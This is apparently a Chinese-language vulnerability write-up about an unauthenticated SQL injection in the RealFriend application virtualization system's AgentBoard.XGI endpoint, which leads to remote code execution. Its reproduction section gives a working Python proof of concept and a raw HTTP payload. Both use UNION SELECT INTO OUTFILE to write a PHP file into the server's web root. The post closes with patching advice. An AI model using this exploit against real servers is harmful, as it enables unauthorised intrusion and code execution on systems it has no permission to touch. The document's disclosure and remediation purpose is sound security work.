---
title: "瑞友天翼应用虚拟化系统 AgentBoard.XGI 远程代码执行漏洞"
date: 2026-10-16 09:11:10
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "瑞友天翼应用虚拟化系统-AgentBoard.XGI"
tags:
  - "瑞友天翼应用虚拟化系统-AgentBoard.XGI"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过 WEB 即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。未经身份认证的远程攻击者可以利用系统中存在的 SQL 注入漏洞，写入后门文件，从而执行远程代码。

## 漏洞影响

```
5.x <= 瑞友天翼应用虚拟化系统 <= 7.0.3.1
```

## 漏洞复现

poc

```
import requests
import sys

url = sys.argv[1]
payload="/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-&cmd=UserLogin"
repose = requests.get(url=url+payload)
if repose.status_code ==200:
    a = url + '1.php'
    b = requests.get(url=a)
    if b.status_code == 200:
        print('[+] 漏洞存在，验证地址: {}1.php '.format(url))
```

payload

```
GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-&cmd=UserLogin HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0
Upgrade-Insecure-Requests: 1
```

## 漏洞修复

1. 避免将该系统开放至公网。
2. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，建议您在升级前做好数据备份工作，避免出现意外，酌情升级至安全版本：http://soft.realor.cn:88/Gwt7.0.4.1.exe

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-AgentBoard.XGI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
